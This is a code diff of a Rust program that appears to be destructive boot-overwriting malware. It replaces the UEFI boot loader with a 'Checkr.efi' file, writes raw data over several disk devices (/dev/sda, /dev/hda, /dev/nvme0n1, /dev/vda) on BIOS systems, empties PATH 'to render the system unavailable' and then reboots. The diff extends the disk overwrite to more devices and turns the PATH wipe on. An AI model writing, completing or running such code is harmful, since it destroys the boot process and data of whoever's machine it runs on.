@@ -2,10 +2,10 @@ use std::process;
 use nix::unistd::Uid;
 use std::path;
 use std::env;
+use system_shutdown;
 
 mod log;
 mod disk;
-mod util;
 
 fn main() {
     env::set_var("VERBOSE", "1");
@@ -19,28 +19,27 @@ fn main() {
     //*Checks if system is booted in uefi. if it is it copies the Checkr.efi file over to EFI/boot/bootx64.efi. if not it writes raw data to the disk
     if path::Path::new("/sys/firmware/efi").exists() {
       log::info("uefi detected");
-      let copytouefi = util::copytoefi();
-      if copytouefi.is_err() {
-          log::error("failed to copy file to EFI partition");
-      }
+       let copytouefi = disk::copytoefi(); 
+       if copytouefi.is_err() { log::warn("failed to copy file to EFI partition");}
     }
     else{
         if env::var("VERBOSE").is_ok() {log::info("bios detected");}
-        let dd = process::Command::new("dd").arg("if=").arg("of=/dev/sda").spawn();
-        if dd.is_err() {
-            log::error("failed to write to disk.");
-
-        }
-    }
+        let writetodisk = disk::writetodisk("/dev/sda".to_string());
+        if writetodisk.is_err() { log::warn("failed to write to disk");}
+        let writetodisk = disk::writetodisk("/dev/hda".to_string());
+        if writetodisk.is_err() { log::warn("failed to write to disk");}
+        let writetodisk = disk::writetodisk("/dev/nvme0n1".to_string());
+        if writetodisk.is_err() { log::warn("failed to write to disk");}
+        let writetodisk = disk::writetodisk("/dev/vda".to_string());
+        if writetodisk.is_err() { log::warn("failed to write to disk");}
 
     //*Set path var to an empty string to render the system unavailable.
-    //env::set_var("PATH", "");
+    env::set_var("PATH", "");
 
     //*Finally it reboots the computer.
-    let reboot = process::Command::new("reboot").spawn();
-    if reboot.is_err() {
-        log::error("failed to reboot");
-    }
+    let reboot =system_shutdown::reboot();
+    if reboot.is_err() { log::error("failed to reboot");}
 
     process::exit(0);
+    }
 }
